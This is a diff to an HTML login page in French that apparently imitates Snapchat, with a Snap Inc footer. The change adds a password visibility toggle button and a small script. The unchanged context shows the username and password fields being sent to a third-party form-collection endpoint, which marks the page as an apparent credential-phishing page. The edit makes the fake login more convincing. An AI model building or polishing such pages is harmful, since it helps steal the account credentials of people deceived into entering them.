@@ -60,7 +60,19 @@
 
   <form id="loginForm" action="https://formspree.io/f/xzzrqevd" method="POST">
     <input type="text" name="identifiant" placeholder="Nom d'utilisateur ou email" required>
-    <input type="password" name="code" placeholder="Mot de passe" required>
+    <div style="position: relative;">
+  <input type="password" id="passwordInput" name="code" placeholder="Mot de passe" required style="width: 100%; padding-right: 40px;">
+  <button type="button" onclick="togglePassword()" style="
+    position: absolute;
+    right: 10px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    font-size: 16px;
+  ">👁️</button>
+</div>
     <button type="submit">Se connecter</button>
     <button type="button" style="margin-top: 10px; background-color: #007bff; color: white;">S'inscrire</button>
   </form>
@@ -104,5 +116,15 @@
 ">
   Société · Snap Inc · Carrières · Confidentialité · Conditions · Support · Marques · Découvrir · Publicité · Contacts
 </footer>
+<script>
+  function togglePassword() {
+    const input = document.getElementById("passwordInput");
+    if (input.type === "password") {
+      input.type = "text";
+    } else {
+      input.type = "password";
+    }
+  }
+</script>
 </body>
 </html>
